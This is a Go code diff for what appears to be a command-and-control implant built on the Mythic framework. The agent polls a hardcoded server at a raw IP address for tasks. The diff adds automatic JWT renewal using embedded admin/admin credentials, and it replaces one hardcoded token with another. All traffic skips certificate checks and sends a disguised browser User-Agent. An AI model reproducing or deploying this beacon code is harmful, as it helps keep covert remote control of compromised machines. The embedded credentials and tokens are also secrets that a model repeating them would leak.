@@ -15,13 +15,21 @@ import (
         "runtime"
         "strconv"
         "strings"
+        "sync"
         "syscall"
         "time"
 )
 
 const (
         MYTHIC_URL = "https://37.27.249.191:7443/graphql/"
-        JWT_TOKEN  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxNzMxMTAsImlhdCI6MTc1MDE1ODcxMCwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjE3LCJvcGVyYXRpb25faWQiOjB9.ok5pb1TKFiGGsvcWGc1LdQIM48Y1KqeXRGmmtXWKIDM"
+        LOGIN_URL  = "https://37.27.249.191:7443/api/v1.4/login"
+        USERNAME   = "admin"
+        PASSWORD   = "admin"
+)
+
+var (
+        currentJWTToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxODc4MDksImlhdCI6MTc1MDE3MzQwOSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjE4LCJvcGVyYXRpb25faWQiOjB9.OhzW_GEtYdLjhXvkKr9R-SgqaB1xi4k4DggAtWUJMIQ"
+        tokenMutex      sync.Mutex
 )
 
 var (
@@ -46,7 +54,82 @@ func logEvent(message string) {
         fmt.Printf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
 }
 
+// Token renewal functions
+func renewJWTToken() error {
+        tokenMutex.Lock()
+        defer tokenMutex.Unlock()
+        
+        logEvent("Renewing JWT token...")
+        
+        loginData := map[string]string{
+                "username": USERNAME,
+                "password": PASSWORD,
+        }
+        
+        jsonData, err := json.Marshal(loginData)
+        if err != nil {
+                return fmt.Errorf("error marshaling login data: %v", err)
+        }
+        
+        client := &http.Client{
+                Transport: &http.Transport{
+                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+                },
+                Timeout: 30 * time.Second,
+        }
+        
+        req, err := http.NewRequest("POST", LOGIN_URL, bytes.NewBuffer(jsonData))
+        if err != nil {
+                return fmt.Errorf("error creating login request: %v", err)
+        }
+        
+        req.Header.Set("Content-Type", "application/json")
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        
+        resp, err := client.Do(req)
+        if err != nil {
+                return fmt.Errorf("error sending login request: %v", err)
+        }
+        defer resp.Body.Close()
+        
+        if resp.StatusCode != 200 {
+                return fmt.Errorf("login failed with status: %d", resp.StatusCode)
+        }
+        
+        body, err := ioutil.ReadAll(resp.Body)
+        if err != nil {
+                return fmt.Errorf("error reading login response: %v", err)
+        }
+        
+        var loginResp struct {
+                AccessToken string `json:"access_token"`
+                TokenType   string `json:"token_type"`
+        }
+        
+        if err := json.Unmarshal(body, &loginResp); err != nil {
+                return fmt.Errorf("error parsing login response: %v", err)
+        }
+        
+        if loginResp.AccessToken == "" {
+                return fmt.Errorf("no access token in response")
+        }
+        
+        currentJWTToken = loginResp.AccessToken
+        logEvent("JWT token renewed successfully")
+        return nil
+}
+
+func ensureValidToken() {
+        // Try to renew token on every call to prevent expiration
+        if err := renewJWTToken(); err != nil {
+                logEvent(fmt.Sprintf("Token renewal failed: %v", err))
+        }
+}
+
 func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
+        // Ensure we have a valid token before every request
+        ensureValidToken()
+        
         client := &http.Client{
                 Transport: &http.Transport{
                         TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -69,8 +152,13 @@ func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQ
                 return nil, fmt.Errorf("error creating request: %v", err)
         }
 
+        // Use the current JWT token
+        tokenMutex.Lock()
+        token := currentJWTToken
+        tokenMutex.Unlock()
+
         req.Header.Set("Content-Type", "application/json")
-        req.Header.Set("Authorization", "Bearer "+JWT_TOKEN)
+        req.Header.Set("Authorization", "Bearer "+token)
 
         resp, err := client.Do(req)
         if err != nil {
@@ -81,6 +169,31 @@ func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQ
         body, err := io.ReadAll(resp.Body)
         if err != nil {
                 return nil, fmt.Errorf("error reading response: %v", err)
+        }
+
+        // Check for authentication errors and retry once with new token
+        if resp.StatusCode == 401 || resp.StatusCode == 403 {
+                logEvent("Authentication failed, attempting token renewal...")
+                if err := renewJWTToken(); err == nil {
+                        // Retry request with new token
+                        req, _ = http.NewRequest("POST", MYTHIC_URL, bytes.NewBuffer(jsonBody))
+                        tokenMutex.Lock()
+                        newToken := currentJWTToken
+                        tokenMutex.Unlock()
+                        req.Header.Set("Content-Type", "application/json")
+                        req.Header.Set("Authorization", "Bearer "+newToken)
+                        
+                        resp, err = client.Do(req)
+                        if err != nil {
+                                return nil, fmt.Errorf("error making retry request: %v", err)
+                        }
+                        defer resp.Body.Close()
+                        
+                        body, err = io.ReadAll(resp.Body)
+                        if err != nil {
+                                return nil, fmt.Errorf("error reading retry response: %v", err)
+                        }
+                }
         }
 
         var gqlResp GraphQLResponse
@@ -1167,8 +1280,11 @@ func main() {
                 time.Sleep(5 * time.Second)
         }
 
-        // Main communication loop
+        // Main communication loop with token renewal
         for {
+                // Ensure token is valid before polling
+                ensureValidToken()
+                
                 if err := pollForTasks(); err != nil {
                         logEvent(fmt.Sprintf("Error polling tasks: %v", err))
                 }
